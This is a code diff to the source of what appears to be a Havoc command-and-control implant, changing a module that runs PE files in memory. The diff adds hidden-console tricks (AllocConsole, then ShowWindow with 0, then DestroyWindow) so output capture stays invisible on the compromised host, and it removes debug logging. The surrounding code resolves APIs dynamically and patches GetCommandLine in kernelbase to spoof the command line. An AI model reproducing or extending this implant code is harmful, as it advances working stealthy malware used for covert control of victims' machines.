@@ -56,6 +56,18 @@ namespace HavocImplant.AgentFunctions
         { 
             return (bool)kernel32.dynamicExecute<Delegates.SetStdHandle>("SetStdHandle", new object[] { nStdHandle, hHandle});
         }
+        public bool AllocConsole()
+        {
+            return (bool)kernel32.dynamicExecute<Delegates.AllocConsole>("AllocConsole", new object[]{ });
+        }
+        public IntPtr GetConsoleWindow()
+        {
+            return (IntPtr)kernel32.dynamicExecute<Delegates.GetConsoleWindow>("GetConsoleWindow", new object[] { });
+        }
+        public bool HideWindow(IntPtr hWnd) 
+        {
+            return (bool)user32.dynamicExecute<Delegates.ShowWindow>("ShowWindow", new object[] { hWnd, 0 });
+        }
         public bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped)
         {
             object[] args = new object[] { hFile, lpBuffer, nNumberOfBytesToRead, (uint)0, lpOverlapped };
@@ -74,6 +86,8 @@ namespace HavocImplant.AgentFunctions
         Implant agent;
         dll ntdll = globalDll.ntdll;
         dll kernel32 = globalDll.kernel32;
+        dll win32u = globalDll.win32u;
+        dll user32 = globalDll.user32;
         public string output;
         // General PE stuff
         public Structs.Win32.IMAGE_DOS_HEADER dosHeader;
@@ -113,6 +127,8 @@ namespace HavocImplant.AgentFunctions
 
         private FileDescriptorPair _kpStdOutPipes;
         private Task<string> _readTask;
+
+        private IntPtr hWin;
 
         public static void Run(Implant agent, string taskInfo, int taskId)
         {
@@ -329,20 +345,6 @@ namespace HavocImplant.AgentFunctions
             {
                 IntPtr pCommandLineString = (IntPtr)Utils.dynamicAPIInvoke<Delegates.GetCommandLineA>("Kernel32", "GetCommandLineW", new object[] { });
                 string commandLineString = Marshal.PtrToStringAuto(pCommandLineString);
-#if debug
-                IntPtr pCommandLineStringA = (IntPtr)Utils.dynamicAPIInvoke<Delegates.GetCommandLineA>("Kernel32", "GetCommandLineA", new object[] { });
-                string commandLineStringA = Marshal.PtrToStringAuto(pCommandLineStringA);
-                Console.WriteLine($"Wide: {commandLineString}, length is {commandLineString.Length}");
-                for (int i = 0; i < commandLineString.Length; i++)
-                {
-                    Console.WriteLine($"Wide byte {i} is {Marshal.ReadByte(IntPtr.Add(pCommandLineString, i))}");
-                }
-                Console.WriteLine($"Ansi: {commandLineStringA}, length is {commandLineStringA.Length}");
-                for (int i = 0; i < commandLineStringA.Length; i++)
-                {
-                    Console.WriteLine($"Ansi byte {i} is {Marshal.ReadByte(IntPtr.Add(pCommandLineStringA, i))}");
-                }
-#endif
 
                 Encoding _encoding = Encoding.UTF8;
 
@@ -355,36 +357,15 @@ namespace HavocImplant.AgentFunctions
 
                     if (!new List<byte>(stringBytes).Contains(0x00)) _encoding = Encoding.ASCII; // At present assuming either ASCII or UTF8
 
-
-
-#if DEBUG
-                    // Print the string bytes and what the encoding was determined to be
-                    var stringBytesHexString = "";
-                    foreach (var x in stringBytes)
-                    {
-                        stringBytesHexString += x.ToString("X") + " ";
-                    }
-
-                    Console.WriteLine($"[*] String bytes: {stringBytesHexString}");
-                    Console.WriteLine($"[*] String encoding determined to be: {_encoding}");
-#endif
                 }
 
                 // Set the GetCommandLine func based on the determined encoding
                 commandLineFunc = _encoding.Equals(Encoding.ASCII) ? "GetCommandLineA" : "GetCommandLineW"; // We're always reading GetCommandLineW so idk why this matters
-
-
-#if DEBUG
-                Console.WriteLine($"Patching {commandLineFunc} because Encoding is {_encoding}");
-                Console.WriteLine($"[*] Old GetCommandLine return value: {Marshal.PtrToStringAuto(pCommandLineString)}");
-#endif
                 // Write the new command line string into memory
                 IntPtr pNewString = _encoding.Equals(Encoding.ASCII)
                     ? Marshal.StringToHGlobalAnsi(newCommandLineString)
                     : Marshal.StringToHGlobalUni(newCommandLineString);
-#if DEBUG
-                Console.WriteLine($"[*] New String Address: 0x{pNewString.ToInt64():X}");
-#endif
+
                 // Create the patch bytes that provide the new string pointer
                 var patchBytes = new List<byte>() { 0x48, 0xB8 }; // TODO architecture
                 var pointerBytes = BitConverter.GetBytes(pNewString.ToInt64());
@@ -396,11 +377,6 @@ namespace HavocImplant.AgentFunctions
                 // Patch the GetCommandLine function to return the new string
                 originalCommandLineFuncBytes = Utils.PatchFunction(ntdll, "kernelbase", commandLineFunc, patchBytes.ToArray());
                 if (originalCommandLineFuncBytes == null) return false;
-
-#if DEBUG
-                var pNewCommandLineString = (IntPtr)Utils.dynamicAPIInvoke<Delegates.GetCommandLineA>("Kernel32", "GetCommandLineW", new object[] { }); ;
-                Console.WriteLine($"[*] New GetCommandLine return value: {Marshal.PtrToStringAuto(pNewCommandLineString)}");
-#endif
                 return true;
             }
 
@@ -412,9 +388,13 @@ namespace HavocImplant.AgentFunctions
         }
         public void BeginRedirect()
         {
+            AllocConsole();
+            hWin = GetConsoleWindow();
+            HideWindow(hWin);
+
             _oldGetStdHandleOut = GetStdHandle(STD_OUTPUT_HANDLE);
             _oldGetStdHandleError = GetStdHandle(STD_ERROR_HANDLE);
-
+            
             //Creating STDOut/IN/ERR Pipes to redirect to
             Structs.Win32.SECURITY_ATTRIBUTES outSA = default;
             outSA.nLength = Marshal.SizeOf(outSA);
@@ -506,9 +486,6 @@ namespace HavocImplant.AgentFunctions
                 {
                     bool ok = ReadFile(_kpStdOutPipes.Read, buffer, BYTES_TO_READ, out uint bytesRead, IntPtr.Zero);
                     if (!ok) break;
-#if DEBUG
-                    Console.WriteLine($"[*] Read {bytesRead} bytes from 'subprocess' pipe");
-#endif
                     if (bytesRead != 0)
                     {
                         outBuffer = new byte[bytesRead];
@@ -521,25 +498,21 @@ namespace HavocImplant.AgentFunctions
         }
         public void EndRedirect()
         {
+            
             SetStdHandle(STD_OUTPUT_HANDLE, _oldGetStdHandleOut);
             SetStdHandle(STD_ERROR_HANDLE, _oldGetStdHandleError);
+            user32.dynamicExecute<Delegates.DestroyWindow>("DestroyWindow", new object[] { hWin });
             try
             {
                 // Need to close write before read else it hangs as could still be writing
                 if (_kpStdOutPipes.Write != IntPtr.Zero)
                 {
                     CloseHandle(_kpStdOutPipes.Write);
-#if DEBUG
-                    Console.WriteLine("[+] CloseHandle write");
-#endif
                 }
 
                 if (_kpStdOutPipes.Read != IntPtr.Zero)
                 {
                     CloseHandle(_kpStdOutPipes.Read);
-#if DEBUG
-                    Console.WriteLine("[+] CloseHandle read");
-#endif
                 }
             }
             catch (Exception e)
@@ -549,14 +522,8 @@ namespace HavocImplant.AgentFunctions
         }
         public void ReadOutput()
         {
-#if DEBUG
-            Console.WriteLine("[*] Retrieving the 'subprocess' stdout & stderr");
-#endif
             while (!_readTask.IsCompleted)
             {
-#if DEBUG
-                Console.WriteLine("[*] Waiting for the task reading from pipe to finish...");
-#endif
                 Thread.Sleep(2000);
             }
 
